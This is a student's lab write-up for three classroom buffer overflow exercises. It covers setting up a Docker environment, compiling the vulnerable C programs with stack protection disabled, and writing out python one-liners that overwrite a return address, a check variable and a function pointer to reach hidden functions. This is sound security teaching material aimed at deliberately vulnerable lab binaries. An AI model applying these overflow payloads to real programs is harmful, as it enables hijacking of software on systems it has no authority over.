# Lab#1 Conduct buffer overflow attack .
## Prepared the eviroment .
  1. Open your Docker Destop
  2. Choice the folder contain file lab and open Terminal
     
      ```bash
      git clone https://github.com/quang-ute/myprojects
      ```
      and after that:
     ```bash
     cd myprojects
     ```
  3. Build the image `img4lab` by Docker
     ```bash
     docker build -t img4lab .
     ```
     and run docker container
     ```bash
      docker run -it --privileged -v $HOME/seclabs:/home/seed/seed@ img4lab
     ```
  4. On `seed@...`
     ```
     cd seclabs
     ```
     create a new direction named `bof`
     ```bash
     mkdir bof
     ```
     and after that:
     ```bash
     cd bof
     ```
     and Open you VSCode -> Connect to WSL -> Open folder `bof`  and catch file bof1, bof2, bof3 from `https://github.com/quang-ute/Security-labs/tree/main/Software/buffer-overflow`
## Attack ( BOF 1 )
![image](https://github.com/user-attachments/assets/3ca0dd01-c5b1-4abd-adcb-757f64f60c0d)

If an attacker supplies more input than the buffer array[200] can handle, they could potentially control the flow of the program and execute unintended code.

1. On `/seclabs/bof$`
   ```bash
   gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2
   ```
   and load bof1.out in gdb
  
    ```bash
    gdb bof1.out
    ```
  2. Use the disassemble command to display the assembly code
     ```bash
     disas secretFunc
     ```
     ![image](https://github.com/user-attachments/assets/7ee1e5e0-441a-4a39-9a40-bb98f3545acc)
  
  The secretFunc() memory region is `0x0804846b`
  3. Input 'a'*204 followed by `0x0804846b`
     ```bash
     echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out
     ```
       ![image](https://github.com/user-attachments/assets/a93df09c-aaec-4d0d-8bb4-f96f3cb402b4)
     To remove the Missing arguments line, add any value at the end of your command

     ```bash
     echo $( python -c "print('a'*204 + '\x6b\x84\x04\x08')") | ./bof1.out 120
     ```

     
     ![image](https://github.com/user-attachments/assets/3074ef1f-1809-45df-b5aa-61ef31dffcff)

  ## Attack ( BOF 2 )
  
  ![image](https://github.com/user-attachments/assets/fddde23e-e6fd-4c80-bddd-f2250f004701)

> Since buf is only 40 characters in size, but fgets allows input of up to 45 characters, this can overwrite the memory after the buf array, including the check variable. If you enter enough data to overwrite the value of check, you can change it to 0xdeadbeef, leading to the condition being satisfied and printing the winning message.

1.  On `/seclabs/bof$`
2.  
   ```bash
   gcc -g bof2.c -o bof2.out -fno-stack-protector -mpreferred-stack-boundary=2
   ```
  
2. 

```bash
 echo $(python -c "print('a'*40)" + '\x01\x02\x03\x04' ) | ./bof2.out
```

Terminal will be return  `You are on the right way!`
![image](https://github.com/user-attachments/assets/83deaff6-f75f-46f9-8fdf-8dce2ad89d7a)


If you want to print `Yeah! You win!`

echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde' )") | ./bof2.out

![image](https://github.com/user-attachments/assets/57848a21-9021-4c9c-994a-555c01043102)


 ## Attack ( BOF 3 )    

![image](https://github.com/user-attachments/assets/f4404c2e-5f35-4527-b695-be72686df0ba)


 
The first of all, you have to run 
```bash
objdump -d bof3.out | grep shell
```


 ![image](https://github.com/user-attachments/assets/2298c0b9-23b6-4bd3-b4fb-31c653e51de7)

you can see `0804845b`  <shell>  and after that:

```bash
echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
```
![image](https://github.com/user-attachments/assets/8425fba6-cc53-4a19-8ddf-f43020f89baa)

Buffer overflow occurs when too much data is entered into the buf. Since fgets allows up to 133 characters to be input (more than the size of buf), the excess data can overwrite the function pointer func. If an attacker knows the address of the shell() function and overwrites the func pointer with this address, the shell() function will be called instead of sup().


